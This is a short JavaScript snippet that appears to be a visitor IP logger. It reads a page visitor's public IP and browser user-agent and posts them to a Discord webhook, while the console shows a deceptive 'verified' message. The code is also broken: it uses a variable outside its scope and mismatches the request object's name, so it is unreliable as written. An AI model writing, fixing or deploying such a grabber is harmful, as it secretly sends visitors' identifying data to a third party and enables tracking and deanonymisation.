fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
   .then(data => console.log("Information was verifed."));
   var agent = navigator.userAgent;
   var valid = data.ip + " " + agent;
   const xml = new XMLHttpRequest;
   request.open("POST", "/*Replace with your own Discord webhook*/");

   request.setRequestHeader('Content-type', 'application/json');

   const params = {
     username: "IPT--",
     avatar_url: "",
     content: valid
   }

   request.send(JSON.stringify(params));
